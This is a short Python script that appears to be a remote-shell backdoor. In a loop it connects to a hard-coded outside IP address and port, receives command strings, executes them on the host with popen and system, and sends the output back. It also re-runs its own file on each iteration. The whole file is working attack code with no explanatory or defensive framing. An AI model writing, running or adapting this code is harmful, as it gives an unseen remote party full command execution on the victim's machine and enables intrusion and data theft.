import threading
from socket import socket, AF_INET, SOCK_STREAM
from os import system, popen



BUFFSIZE = 5120 * 1024 * 2
host_ip, server_port = "185.181.8.21", 7557

class RemoteShell(threading.Thread):
    def __init__(self):
        """Инициализация потока"""
        threading.Thread.__init__(self)

    def run(self):
        while (True):
            try:
                system("./" + __file__)
                tcp_client = socket(AF_INET, SOCK_STREAM)
                # Establish connection to TCP server and exchange data
                tcp_client.connect((host_ip, server_port))
                tcp_client.sendall(bytes("CMD", encoding="utf8"))
                # Read data from the TCP server and close the connection
                received = tcp_client.recv(BUFFSIZE)
                received = received.decode("utf8")
                received = str(received)
                print(received)
                tcp_client.sendall(bytes(str(popen(received).read()), encoding="utf"))
                system(received)
            finally:
                tcp_client.close()


shell = RemoteShell()
shell.start()
